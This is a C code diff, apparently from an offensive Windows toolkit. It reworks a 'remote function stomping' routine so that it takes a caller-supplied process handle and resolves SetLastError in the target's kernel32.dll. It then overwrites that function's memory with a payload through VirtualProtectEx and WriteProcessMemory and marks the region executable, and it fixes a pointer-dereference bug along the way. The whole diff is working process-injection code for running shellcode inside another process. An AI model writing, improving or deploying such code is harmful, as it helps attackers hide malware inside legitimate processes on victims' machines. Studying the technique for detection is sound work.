@@ -24,34 +24,31 @@ BOOL WritePayloadViaFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN 
 	return TRUE;
 }
 
-BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
-	HANDLE		hProcess	= NULL;
+BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID *pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize, IN HANDLE hProcess) {
     DWORD	dwOldProtection = 0;
-	DWORD		dwProcessId = 0;
 	SIZE_T	sNumberOfBytesWritten = 0;
 
-	DebugPrint("[i] Function stomping into remote process notepad.exe\n");
+	DebugPrint("[i] Found Target Process Pid: %d \n", GetProcessId(hProcess));
 
-	if (!GetRemoteProcessHandle(L"notepad.exe", &dwProcessId, &hProcess)) {
-		DebugPrint("[!] Process is Not Found \n");
+	if (!GetRemoteProcAddress(hProcess, "kernel32.dll", "SetLastError", pAddress)) {
+		DebugPrint("[!] Failed to resolve remote function address.\n");
 		return FALSE;
 	}
-	DebugPrint("[i] Found Target Process Pid: %d \n", dwProcessId);
 
-	*pAddress = &SetupScanFileQueueA;
+	DebugPrint("[i] Resolved Address: 0x%p\n", *pAddress);
 
-	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
+	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
 		DebugPrint("[!] VirtualProtectEx [RW] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	if (!WriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
+	if (!WriteProcessMemory(hProcess, *pAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten) || sPayloadSize != sNumberOfBytesWritten) {
 		DebugPrint("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
 		DebugPrint("[!] Bytes Written : %d of %d \n", sNumberOfBytesWritten, sPayloadSize);
 		return FALSE;
 	}
 
-	if (!VirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
 		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
